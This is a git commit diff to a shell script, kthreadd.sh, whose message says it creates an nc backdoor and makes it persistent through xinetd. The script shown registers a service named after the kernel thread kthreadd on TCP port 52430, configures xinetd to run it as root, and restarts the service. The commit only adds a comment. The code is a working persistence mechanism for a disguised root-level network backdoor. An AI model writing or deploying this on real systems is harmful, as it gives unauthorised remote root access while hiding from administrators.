fd6402cdc46ca8d55dddd5db6fb72a45ff77d9d5
steveirwincyber <55242374+steveirwincyber@users.noreply.github.com>
2021-09-15 11:06:38 -0400

    Update kthreadd.sh
    Creates the nc backdoor, and adds it to the xinetd service for persistance

--- xinetbackdoor/kthreadd.sh
+++ xinetbackdoor/kthreadd.sh
@@ -4,4 +4,4 @@ chmod +x /etc/xinetd.d/kthreadd
 echo 'kthreadd        52430/tcp                # ktheadd >> /etc/services
 echo -e 'service kthreadd\n{\nsocket_type = stream\ndisable=no\nprotocol = tcp\nserver = /etc/xinetd.d/kthreadd\nport = 52430\nwait = no\n user=root\n}' > /etc/xinetd.d/kthreadd
 chmod +x /etc/init.d/kthreadd
-service xinetd restart 2&>/dev/null
+service xinetd restart 2&>/dev/null # retarts service for it to take place
